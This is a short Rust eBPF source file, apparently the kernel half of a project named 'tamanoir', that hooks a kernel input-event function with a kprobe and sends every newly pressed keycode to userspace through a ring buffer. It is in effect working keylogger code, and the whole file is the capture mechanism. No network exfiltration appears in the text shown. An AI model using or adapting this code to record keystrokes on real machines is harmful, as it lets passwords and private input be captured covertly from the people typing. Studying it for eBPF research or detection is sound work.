#![no_std]
#![no_main]

use aya_ebpf::{
    macros::{kprobe, map},
    maps::{Array, RingBuf},
    programs::ProbeContext,
};
use aya_log_ebpf::info;

const KEY_EVENT: u32 = 1;

#[map]
static LAST_KEY: Array<u32> = Array::with_max_entries(1, 0);

#[map]
static DATA: RingBuf = RingBuf::with_byte_size(4096, 0);

#[inline]
fn submit(key: u32) {
    if let Some(mut buf) = DATA.reserve::<u32>(0) {
        unsafe { (*buf.as_mut_ptr()) = key };
        buf.submit(0);
    }
}

#[kprobe]
pub fn tamanoir(ctx: ProbeContext) -> u32 {
    match process(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn process(ctx: ProbeContext) -> Result<u32, u32> {
    let event_type: u32 = ctx.arg(1).ok_or(0u32)?;
    let code: u32 = ctx.arg(2).ok_or(0u32)?;
    let value: u32 = ctx.arg(3).ok_or(0u32)?;

    if event_type == KEY_EVENT && value != 0 {
        if let Some(key) = LAST_KEY.get_ptr_mut(0) {
            if unsafe { *key } == code {
                unsafe { *key = 0 };
            } else {
                unsafe { *key = code };
                info!(&ctx, "Key {} Pressed", code);
                submit(code);
            }
        }
    }

    Ok(0)
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
